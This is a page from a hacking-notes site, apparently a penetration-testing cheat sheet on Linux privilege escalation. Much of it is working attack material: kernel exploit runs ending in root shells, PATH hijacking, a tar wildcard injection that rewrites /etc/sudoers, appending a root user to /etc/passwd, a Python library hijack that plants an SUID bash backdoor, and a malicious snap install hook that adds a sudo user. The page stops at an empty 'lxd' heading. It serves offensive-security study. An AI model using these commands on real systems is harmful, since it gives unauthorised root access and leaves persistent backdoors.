<!DOCTYPE html>

<html>
	<head>
		<meta charset="utf-8">
		<meta name="viewport" content="width=device-width, initial-scale=1">

		<!-- Begin Jekyll SEO tag v2.5.0 -->
<title>Linux Privesc | Hacking Notes</title>
<meta name="generator" content="Jekyll v3.8.4" />
<meta property="og:title" content="Linux Privesc" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="Privilege Escalation usually involves going from a lower permission to a higher permission." />
<meta property="og:description" content="Privilege Escalation usually involves going from a lower permission to a higher permission." />
<link rel="canonical" href="http://0.0.0.0:4000/hackingnotes/privilege-escalation/linux-privesc/" />
<meta property="og:url" content="http://0.0.0.0:4000/hackingnotes/privilege-escalation/linux-privesc/" />
<meta property="og:site_name" content="Hacking Notes" />
<script type="application/ld+json">
{"description":"Privilege Escalation usually involves going from a lower permission to a higher permission.","url":"http://0.0.0.0:4000/hackingnotes/privilege-escalation/linux-privesc/","@type":"Article","publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"http://0.0.0.0:4000/hackingnotes/siteicon.png"}},"headline":"Linux Privesc","@context":"http://schema.org"}</script>
<!-- End Jekyll SEO tag -->

		<link type="application/atom+xml" rel="alternate" href="http://0.0.0.0:4000/hackingnotes/feed.xml" title="Hacking Notes" />

		<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Merriweather:400,400italic,700,700italic|Open+Sans:400,400italic,600,600italic,700,700italic|Inconsolata:400,700">
		<link rel="stylesheet" href="/hackingnotes/css/main.css">
		<link rel="apple-touch-icon" href="/hackingnotes/apple-touch-icon.png">
		<link rel="icon" type="image/png" href="/hackingnotes/touch-icon.png" sizes="192x192">
		<link rel="icon" type="image/png" href="/hackingnotes/images/favicon.png">

		
	</head>

	<body>
		<header>
			<h1>
				<a href="/hackingnotes/"><img src="/hackingnotes/images/emblem.svg" width="40" height="40" alt="Hacking Notes logo"></a>
				Hacking Notes
				<button type="button" class="open-nav" id="open-nav"></button>
			</h1>

			<form action="/hackingnotes/search/" method="get">
				<input type="text" name="q" id="search-input" placeholder="Search" autofocus>
				<input type="submit" value="Search" style="display: none;">
			</form>

			<nav class="full-navigation">
				<ul>
					<li class="nav-item top-level ">
						
						<a href="/hackingnotes/">What is this?</a>
					</li>
				</ul>

				<ul>
					
					
						<li class="nav-item top-level ">
							
							<a href="/hackingnotes/active-directory/domain-enumeration/">Active Directory</a>
							<ul>
								
									<li class="nav-item "><a href="/hackingnotes/active-directory/domain-enumeration/">Domain Enumeration</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/active-directory/lateral-movement/">Lateral Movement</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/active-directory/domain-persistence/">Domain Persistence</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/active-directory/domain-privesc/">Domain Privilege Escalation</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/active-directory/cross-forest-attacks/">Cross Forest Attacks</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/active-directory/forest-persistence/">Forest Persistence</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/active-directory/ad-attacks/">AD Attacks</a></li>
								
							</ul>
						</li>
					
						<li class="nav-item top-level ">
							
							<a href="/hackingnotes/client-side-attacks/evil-pdf/">Client Side Attacks</a>
							<ul>
								
									<li class="nav-item "><a href="/hackingnotes/client-side-attacks/evil-pdf/">Evil PDF</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/client-side-attacks/microsoft-office-macros/">Microsoft Office Macros</a></li>
								
							</ul>
						</li>
					
						<li class="nav-item top-level ">
							
							<a href="/hackingnotes/enumeration/host-discovery/">Enumeration</a>
							<ul>
								
									<li class="nav-item "><a href="/hackingnotes/enumeration/host-discovery/">Host Discovery</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/enumeration/dns-enumeration/">DNS Enumeration</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/enumeration/os-discovery/">OS Discovery</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/enumeration/port-scanning/">Port Scanning</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/enumeration/waf-evasion/">WAF Evasion</a></li>
								
							</ul>
						</li>
					
						<li class="nav-item top-level ">
							
							<a href="/hackingnotes/exploiting/buffer-overflow/">Exploiting</a>
							<ul>
								
									<li class="nav-item "><a href="/hackingnotes/exploiting/buffer-overflow/">Buffer Overflow</a></li>
								
							</ul>
						</li>
					
						<li class="nav-item top-level ">
							
							<a href="/hackingnotes/hacking-wifi/theory/">Hacking Wifi</a>
							<ul>
								
									<li class="nav-item "><a href="/hackingnotes/hacking-wifi/theory/">Theory</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/hacking-wifi/wep/">Hacking Wifi - WEP</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/hacking-wifi/wpa-wpa2-psk/">Hacking Wifi - WPA/WPA2 PSK</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/hacking-wifi/wpa-wpa2-peap-enterprise/">Hacking Wifi - WPA/WPA2 PEAP (Enterprise)</a></li>
								
							</ul>
						</li>
					
						<li class="nav-item top-level ">
							
							<a href="/hackingnotes/other/hacking-aws/">Other</a>
							<ul>
								
									<li class="nav-item "><a href="/hackingnotes/other/hacking-aws/">Hacking AWS</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/other/hacking-with-powershell/">Hacking with PowerShell</a></li>
								
							</ul>
						</li>
					
						<li class="nav-item top-level ">
							
							<a href="/hackingnotes/post-exploitation/av-evasion/">Post Exploitation</a>
							<ul>
								
									<li class="nav-item "><a href="/hackingnotes/post-exploitation/av-evasion/">AV Evasion</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/post-exploitation/bypass-uac/">Bypass UAC</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/post-exploitation/get-credentials/">Gathering Credentials</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/post-exploitation/password-cracking/">Password Cracking</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/post-exploitation/port-forwarding/">Port Forwarding and Tunneling</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/post-exploitation/reverse-shell/">Reverse Shell</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/post-exploitation/transfering-files/">Transfering Files</a></li>
								
							</ul>
						</li>
					
						<li class="nav-item top-level current">
							
							<a href="/hackingnotes/privilege-escalation/linux-privesc/">Privilege Escalation</a>
							<ul>
								
									<li class="nav-item current"><a href="/hackingnotes/privilege-escalation/linux-privesc/">Linux Privesc</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/privilege-escalation/windows-privesc/">Windows Privesc</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/privilege-escalation/run-commands-as/">Run Commands As</a></li>
								
							</ul>
						</li>
					
						<li class="nav-item top-level ">
							
							<a href="/hackingnotes/reconnaissance/information-gathering/">Reconnaissance</a>
							<ul>
								
									<li class="nav-item "><a href="/hackingnotes/reconnaissance/information-gathering/">Information Gathering</a></li>
								
							</ul>
						</li>
					
						<li class="nav-item top-level ">
							
							<a href="/hackingnotes/services/ftp/">Services</a>
							<ul>
								
									<li class="nav-item "><a href="/hackingnotes/services/ftp/">PORT 21/tcp - FTP</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/services/smtp/">PORT 25/tcp - SMTP</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/services/dns/">PORT 53/tcp - DNS</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/services/http/">PORT 80/tcp, 443/tcp - HTTP Server</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/services/rpcbind/">PORT 111/tcp - RPCBind</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/services/imap/">PORT 143/tcp, 993/tcp - IMAP</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/services/smb/">PORT 139/tcp, 445/tcp - SMB</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/services/snmp/">PORT 161/udp - SNMP</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/services/java-rmi/">PORT 1100/tcp - Java RMI</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/services/sql-server/">PORT 1433/tcp - Microsoft SQL Server</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/services/nfs/">PORT 2049/tcp - NFS</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/services/mysql/">PORT 3306/tcp - MySQL Server</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/services/rdp/">PORT 3389/tcp - RDP</a></li>
								
							</ul>
						</li>
					
						<li class="nav-item top-level ">
							
							<a href="/hackingnotes/software/wordpress/">Software</a>
							<ul>
								
									<li class="nav-item "><a href="/hackingnotes/software/wordpress/">WordPress</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/software/drupal/">Drupal</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/software/tomcat/">Tomcat</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/software/jenkins/">Jenkins</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/software/pypi-server/">PyPI Server</a></li>
								
							</ul>
						</li>
					
						<li class="nav-item top-level ">
							
							<a href="/hackingnotes/web/file-inclusion/">Web</a>
							<ul>
								
									<li class="nav-item "><a href="/hackingnotes/web/file-inclusion/">File Inclusion</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/web/login-panes/">Login Panes</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/web/sqli/">SQL Injection (SQLi)</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/web/nosqli/">NoSQL Injection (NoSQLi)</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/web/templates-injections/">Server Side Templates Injections (SSTI)</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/web/unrestricted-file-upload/">Unrestricted File Upload</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/web/oauth-2.0-bypass/">OAuth 2.0 Bypass</a></li>
								
							</ul>
						</li>
					
				</ul>

				<ul>
					<li class="nav-item top-level ">
						
						<a href="/hackingnotes/changelog/">Change Log</a>
					</li>
				</ul>
			</nav>
		</header>

		<section class="main">
			<div class="page-header">
				<h2>Privilege Escalation</h2>
				<h3>Linux Privesc</h3>
			</div>
			<article class="content">
				<p>Privilege Escalation usually involves going from a lower permission to a higher permission.</p>

<h1 id="enumeration-scripts">Enumeration Scripts:</h1>

<p>There are some scripts that could help us in order to escalate privilege on Linux systems. These are two examples:</p>

<ul>
  <li><strong>LinEnum</strong>: <a href="https://github.com/rebootuser/LinEnum/">https://github.com/rebootuser/LinEnum/</a></li>
  <li><strong>LinPEAS</strong>: <a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS">https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS</a>/</li>
</ul>

<h1 id="kernel-vulnerabilities">Kernel Vulnerabilities</h1>

<p>We can exploit some kernel vulnerabilities in order to privesc. <code class="highlighter-rouge">linux-exploit-suggester.sh</code> is an amazing script that do this work.</p>

<ul>
  <li><a href="https://github.com/mzet-/linux-exploit-suggester">https://github.com/mzet-/linux-exploit-suggester</a></li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./linux-exploit-suggester.sh
</code></pre></div></div>

<h2 id="compiling-exploits">Compiling Exploits</h2>

<p>Sometimes we need to compile our exploits in order to get the binary or executable.</p>

<p>For <strong>64-bits:</strong></p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gcc exploit.c <span class="nt">-o</span> exploit
</code></pre></div></div>

<p>For <strong>32-bits:</strong></p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gcc <span class="nt">-m32</span> exploit.c <span class="nt">-o</span> exploit

<span class="c">#i686 and older devices</span>
gcc <span class="nt">-march</span><span class="o">=</span>i686 <span class="nt">-m32</span> <span class="nt">-Wl</span>,--hash-style<span class="o">=</span>both exploit.c <span class="nt">-o</span> exploit
</code></pre></div></div>

<p>Finally we just need to give execution permissions.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">chmod </span>u+x executablename
./executablename
</code></pre></div></div>

<h2 id="ebpf_verifier---linux-kernel--4139">eBPF_verifier - Linux Kernel &lt; 4.13.9</h2>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>gcc cve-2017-16995.c <span class="nt">-o</span> cve-2017-16995
<span class="nv">$ </span><span class="nb">chmod</span> +x cve-2017-16995

<span class="nv">$ </span>./cve-2017-16995
<span class="o">[</span>.]
<span class="o">[</span>.] t<span class="o">(</span><span class="nt">-_-t</span><span class="o">)</span> exploit <span class="k">for </span>counterfeit grsec kernels such as KSPP and linux-hardened t<span class="o">(</span><span class="nt">-_-t</span><span class="o">)</span>
<span class="o">[</span>.]
<span class="o">[</span>.]   <span class="k">**</span> This vulnerability cannot be exploited at all on authentic grsecurity kernel <span class="k">**</span>
<span class="o">[</span>.]
<span class="o">[</span><span class="k">*</span><span class="o">]</span> creating bpf map
<span class="o">[</span><span class="k">*</span><span class="o">]</span> sneaking evil bpf past the verifier
<span class="o">[</span><span class="k">*</span><span class="o">]</span> creating socketpair<span class="o">()</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> attaching bpf backdoor to socket
<span class="o">[</span><span class="k">*</span><span class="o">]</span> skbuff <span class="o">=&gt;</span> ffff88002dc42800
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Leaking sock struct from ffff88003d00d400
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Sock-&gt;sk_rcvtimeo at offset 472
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Cred structure at ffff8800354a0600
<span class="o">[</span><span class="k">*</span><span class="o">]</span> UID from cred structure: 33, matches the current: 33
<span class="o">[</span><span class="k">*</span><span class="o">]</span> hammering cred structure at ffff8800354a0600
<span class="o">[</span><span class="k">*</span><span class="o">]</span> credentials patched, launching shell...

<span class="c"># id</span>
<span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>,33<span class="o">(</span>www-data<span class="o">)</span>
</code></pre></div></div>

<ul>
  <li><a href="https://www.exploit-db.com/exploits/45010">https://www.exploit-db.com/exploits/45010</a></li>
</ul>

<h2 id="dirtyc0w---linux-kernel-2622--39">DirtyC0w - Linux Kernel 2.6.22 &lt; 3.9</h2>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gcc <span class="nt">-pthread</span> dirty.c <span class="nt">-o</span> dirty <span class="nt">-lcrypt</span>
</code></pre></div></div>

<p>Transfer the exploit to the target machine.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">chmod</span> +x dirty
./dirty
</code></pre></div></div>

<ul>
  <li><a href="https://github.com/FireFart/dirtycow/blob/master/dirty.c">https://github.com/FireFart/dirtycow/blob/master/dirty.c</a></li>
</ul>

<h2 id="mempodipper---linux-kernel-2639--322-gentoo--ubuntu-x86x64">Mempodipper - Linux Kernel 2.6.39 &lt; 3.2.2 (Gentoo / Ubuntu x86/x64)</h2>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>gcc mempodipper.c <span class="nt">-o</span> mempodipper
<span class="nv">$ </span><span class="nb">chmod</span> +x mempodipper

<span class="nv">$ </span>./mempodipper
<span class="o">===============================</span>
<span class="o">=</span>          Mempodipper        <span class="o">=</span>
<span class="o">=</span>           by zx2c4          <span class="o">=</span>
<span class="o">=</span>         Jan 21, 2012        <span class="o">=</span>
<span class="o">===============================</span>

<span class="o">[</span>+] Waiting <span class="k">for </span>transferred fd <span class="k">in </span>parent.
<span class="o">[</span>+] Executing child from child fork.
<span class="o">[</span>+] Opening parent mem /proc/1977/mem <span class="k">in </span>child.
<span class="o">[</span>+] Sending fd 3 to parent.
<span class="o">[</span>+] Received fd at 5.
<span class="o">[</span>+] Assigning fd 5 to stderr.
<span class="o">[</span>+] Reading su <span class="k">for </span><span class="nb">exit</span>@plt.
<span class="o">[</span>+] Resolved <span class="nb">exit</span>@plt to 0x8049520.
<span class="o">[</span>+] Calculating su padding.
<span class="o">[</span>+] Seeking to offset 0x8049514.
<span class="o">[</span>+] Executing su with shellcode.
<span class="c"># whoami</span>
root
<span class="c">#</span>
</code></pre></div></div>

<ul>
  <li><a href="https://www.exploit-db.com/exploits/18411">https://www.exploit-db.com/exploits/18411</a></li>
</ul>

<h2 id="abusing-suidguid-files">Abusing SUID/GUID Files</h2>

<p>Check for files with the SUID/GUID bit set. This means that the file or files can be <strong>run with permissions of the file(s) owner/group</strong>. In case of super-user, we can leverage this to get a shell with these privileges.</p>

<p>But when a special permission is given to each user it becomes SUID or SGID. When a extra bit “4” is set to user (Owner) it becomes SUID (Set user ID) and wen bit “2” is set to group it becomes SGID (Set Group ID).</p>

<p><strong>SUID:</strong> <code class="highlighter-rouge">rws-rwx-rws</code> <strong>GUID:</strong> <code class="highlighter-rouge">rwx-rws-rwx</code></p>

<table>
  <thead>
    <tr>
      <th style="text-align: center"><strong>Permission</strong></th>
      <th style="text-align: center"><strong>On Files</strong></th>
      <th style="text-align: center"><strong>On Directories</strong></th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td style="text-align: center">SUID Bit</td>
      <td style="text-align: center">User executes the file with permissions of the <em>file</em> owner.</td>
      <td style="text-align: center">-</td>
    </tr>
    <tr>
      <td style="text-align: center">SGID Bit</td>
      <td style="text-align: center">User executes the file with the permission of the <em>group</em> owner.</td>
      <td style="text-align: center">File created in directory gets the same group owner.</td>
    </tr>
    <tr>
      <td style="text-align: center">Sticky Bit</td>
      <td style="text-align: center">-</td>
      <td style="text-align: center">Users are prevented from deleting files from others users.</td>
    </tr>
  </tbody>
</table>

<p><img src="/hackingnotes/images/suid.png" alt="SUID, SGID and Sticky Bit" /></p>

<h2 id="finding-suid--guid-binaries"><strong>Finding SUID / GUID Binaries:</strong></h2>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>find / <span class="nt">-perm</span> <span class="nt">-u</span><span class="o">=</span>s <span class="nt">-type</span> f 2&gt;/dev/null
find / <span class="nt">-perm</span> <span class="nt">-g</span><span class="o">=</span>s <span class="nt">-type</span> f 2&gt;/dev/null
</code></pre></div></div>

<h2 id="exploiting-path-variable">Exploiting PATH Variable</h2>

<p><code class="highlighter-rouge">PATH</code> is an environmental variable in Linux and Unix-like operating systems which specifies directories that hold executable programs. When the user runs any command in the terminal, it searches for executable files with the help of the <code class="highlighter-rouge">PATH</code> Variable in response to commands executed by a user.</p>

<p><strong>How does this let us escalate privileges?</strong></p>

<p>Let’s say we need an <strong>SUID binary</strong>. Running it, we can see that it’s calling the system shell to do a basic process like list processes with “ps”. We can rewrite the <code class="highlighter-rouge">PATH</code> variable to a location of our choice. So when the SUID binary calls the system shell to run an executable, it runs one that we have written instead. So we need to change the <code class="highlighter-rouge">PATH</code> variable:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">export </span><span class="nv">PATH</span><span class="o">=</span>/tmp
<span class="nb">echo</span> <span class="nv">$PATH</span>
</code></pre></div></div>

<p>And create a file with execution permissions with the same binary name:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo</span> <span class="s2">"/bin/bash"</span> <span class="o">&gt;</span> /tmp/ps
/bin/chmod +x /tmp/ps
</code></pre></div></div>

<p>Finally when the SUID files calls <code class="highlighter-rouge">ps</code> function, instead of showing system processes will execute our command.</p>

<blockquote>
  <p><strong>Remember</strong>: To exploit PATH variable <strong>we need a SUID File</strong> to gain privileges otherwise it will be executed as normal user.</p>
</blockquote>

<h1 id="writeable-folders">Writeable Folders</h1>

<p>We can elevate our privileges some times when we have write permissions in some specific directories.</p>

<blockquote>
  <p><strong>Note</strong>: With write permissions on the folder we can <strong>create/delete/move files</strong> but not modify them.</p>
</blockquote>

<h2 id="on-path-variable">On PATH variable</h2>

<p>When we can write on folders such as <code class="highlighter-rouge">/usr/local/bin</code> <code class="highlighter-rouge">/usr/bin</code> or some others that are included on the PATH variable we can escalate our privileges by <strong>modifying or creating a new binary</strong> that will be executed as <strong>root</strong>.</p>

<h3 id="ssh-port-open">SSH port open</h3>

<p>When we ssh a machine root executes <code class="highlighter-rouge">run-parts</code> binary so we add a malicious binary on the path. Look <a href="https://mvc1009.gitbook.io/hackingnotes/privilege-escalation/linux-privesc#executing-files-with-root">Executing files with root </a>to see which binary we can fit our needs.</p>

<h1 id="abusing-wildcards-">Abusing Wildcards (*)</h1>

<h2 id="tar-argument-injection-in-root-cronjob">Tar Argument Injection in root cronjob</h2>

<p>Imagine you compromise a low-level user on a system and you figure out this command is running as root:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cd</span> /var/log/mon <span class="o">&amp;&amp;</span> <span class="nb">tar</span> <span class="nt">-zcf</span> /tmp/mon.tar.gz <span class="k">*</span>
</code></pre></div></div>

<p>We want to go with <strong>sudoers</strong> <strong>file</strong> as we are lazy and just sudo bash, so let’s see….</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo</span> <span class="s1">'echo "user ALL=(root) NOPASSWD: ALL" &gt; /etc/sudoers'</span> <span class="o">&gt;</span> privesc.sh
<span class="nb">echo</span> <span class="s2">""</span> <span class="o">&gt;</span> <span class="s2">"--checkpoint-action=exec=sh privesc.sh"</span>
<span class="nb">echo</span> <span class="s2">""</span> <span class="o">&gt;</span> <span class="nt">--checkpoint</span><span class="o">=</span>1
</code></pre></div></div>

<h1 id="writeable-etcpasswd">Writeable /etc/passwd</h1>

<p>The <code class="highlighter-rouge">/etc/passwd</code> file stores essential information, which is required during login. In other words, it stores user account information.</p>

<p>if we have a writable <code class="highlighter-rouge">/etc/passwd</code> file, we can write a new line entry allowing us to log in as our own root user. But first, we need to create a compliant password hash.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>openssl passwd <span class="nt">-1</span> <span class="nt">-salt</span> <span class="o">[</span>username] <span class="o">[</span>password]
openssl passwd <span class="o">[</span>password]
</code></pre></div></div>

<p>Finally append the following string to <code class="highlighter-rouge">/etc/passwd</code> file:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>USERNAME]:[HASH]:0:0:root:/root:/bin/bash
</code></pre></div></div>

<p>And finally su to this new user to obtain a <strong>root</strong> <strong>shell</strong>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>su <span class="o">[</span>USERNAME]
</code></pre></div></div>

<h1 id="gtfobins">GTFOBins</h1>

<p>GTFOBins is a curated list of Unix binaries that can be exploited by an attacker to bypass local security restrictions.</p>

<p>Firstly, we need to check the sudo permissions on binaries:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo</span> <span class="nt">-l</span>
</code></pre></div></div>

<p>After that search on <a href="https://gtfobins.github.io">GTOBins web </a>to search how to escape from that binary and obtain a shell:</p>

<ul>
  <li><a href="https://gtfobins.github.io">https://gtfobins.github.io/</a></li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>User user may run the following commands on armageddon:
    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /usr/bin/someBinary
</code></pre></div></div>

<blockquote>
  <p><strong>Remember</strong>: Do <strong>not</strong> <strong>forget</strong> to run the command as <strong>sudo!</strong></p>
</blockquote>

<h2 id="setenv-permission">SETENV permission</h2>

<p>This mean that we can set some environment variables to run the command.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>User user may run the following commands on admirer:
    <span class="o">(</span>ALL<span class="o">)</span> SETENV: /opt/scripts/some.py
</code></pre></div></div>

<p>Search for a library, create a copy in <code class="highlighter-rouge">/tmp</code> and execute commands.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">some</span><span class="o">.</span><span class="n">py</span>

<span class="kn">import</span> <span class="nn">sys</span>
<span class="n">sys</span><span class="o">.</span><span class="nb">exit</span><span class="p">(</span><span class="mi">10</span><span class="p">)</span>
</code></pre></div></div>

<p>We can create a sys.py file on <code class="highlighter-rouge">/tmp</code>.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">os</span>
<span class="k">def</span> <span class="nf">exit</span><span class="p">(</span><span class="n">a</span><span class="p">):</span>
        <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s">"cp /bin/bash /tmp/rev"</span><span class="p">)</span>
        <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s">"chmod u+s /tmp/rev"</span><span class="p">)</span>
</code></pre></div></div>

<p>Finally open the backdoor.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/tmp/rev <span class="nt">-p</span>
rev-4.4# <span class="nb">id
</span><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>user<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>user<span class="o">)</span> <span class="nv">euid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1000<span class="o">(</span>user<span class="o">)</span>
</code></pre></div></div>

<h2 id="snap-install">Snap install</h2>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>User user may run the following commands on armageddon:
    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /usr/bin/snap <span class="nb">install</span> <span class="k">*</span>
</code></pre></div></div>

<p>When we find the following, we can install any malicious packet, so we will add our malicious personal crafted snap packet.</p>

<ul>
  <li><a href="https://ubuntu.com/tutorials/create-your-first-snap#3-building-a-snap-is-easy">https://ubuntu.com/tutorials/create-your-first-snap#3-building-a-snap-is-easy</a></li>
  <li><a href="https://shenaniganslabs.io/2019/02/13/Dirty-Sock.html">https://shenaniganslabs.io/2019/02/13/Dirty-Sock.html</a></li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">mkdir </span>privesnap
<span class="nb">cd </span>privesnap
snapcraft init

<span class="nb">touch </span>snap/hooks/install
</code></pre></div></div>

<p>We need to create a malicious <code class="highlighter-rouge">snap/hooks/install</code> file, and modify <code class="highlighter-rouge">snap/snapcraft.yaml</code></p>

<ul>
  <li>install</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash</span>

<span class="c"># dirty_sock:dirty_sock</span>
useradd dirty_sock <span class="nt">-m</span> <span class="nt">-p</span> <span class="s1">'$6$sWZcW1t25pfUdBuX$jWjEZQF2zFSfyGy9LbvG3vFzzHRjXfBYK0SOGfMD1sLyaS97AwnJUs7gDCY.fg19Ns3JwRdDhOcEmDpBVlF9m.'</span> <span class="nt">-s</span> /bin/bash
usermod <span class="nt">-aG</span> <span class="nb">sudo </span>dirty_sock
<span class="nb">echo</span> <span class="s2">"dirty_sock    ALL=(ALL:ALL) ALL"</span> <span class="o">&gt;&gt;</span> /etc/sudoers
</code></pre></div></div>
<ul>
  <li>snapcraft.yaml</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>name: privesnap
version: <span class="s1">'0.1'</span> 
summary: Empty snap, used <span class="k">for </span>exploit
description: |
    See https://github.com/initstring/dirty_sock

grade: devel
confinement: devmode

parts:
  my-part:
    plugin: nil
</code></pre></div></div>

<h1 id="linux-capabilities">Linux Capabilities</h1>

<blockquote>
  <p>Linux capabilities provide a subset of the available root privileges to a process. This effectively breaks up root privileges into smaller and distinctive units. Each of these units can then be independently be granted to processes. This way the full set of privileges is reduced and decreasing the risks of exploitation.</p>
</blockquote>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>getcap <span class="nt">-r</span> / 2&gt;/dev/null
</code></pre></div></div>

<p>Check the following link to see what means each capability:</p>

<ul>
  <li><a href="https://man7.org/linux/man-pages/man7/capabilities.7.html#:~:text=Starting%20with%20kernel%202.2%2C%20Linux,are%20a%20per%2Dthread%20attribute.">https://man7.org/linux/man-pages/man7/capabilities.7.html#:~:text=Starting%20with%20kernel%202.2%2C%20Linux,are%20a%20per%2Dthread%20attribute.</a></li>
</ul>

<blockquote>
  <p>Note: <strong><code class="highlighter-rouge">ep</code></strong> capability means that can read and write any file on the filesystem.</p>
</blockquote>

<p>More info in:</p>

<ul>
  <li><a href="https://linux-audit.com/linux-capabilities-101/">https://linux-audit.com/linux-capabilities-101/</a></li>
</ul>

<h1 id="exploiting-crontab">Exploiting Crontab</h1>

<p>The <code class="highlighter-rouge">Cron</code> daemon is a long-running process that executes commands at specific dates and times. You can use this to schedule activities, either as on-time events or as recurring tasks.</p>

<p><strong>To view what cronjobs are active</strong> we need to cat the <code class="highlighter-rouge">/etc/crontab</code> file:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat</span> /etc/crontab
</code></pre></div></div>

<p>If we find a script that is scheduled to run as user root and we can write to this file, we can modify it to get a reverse shell when the cronjob run the task.</p>

<h1 id="abusing-privileges-group-memberships">Abusing privileges (Group memberships)</h1>

<h2 id="sudo">sudo</h2>

<p>Thats it, you’re already root:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>su -
</code></pre></div></div>

<h2 id="lxd">lxd</h2>

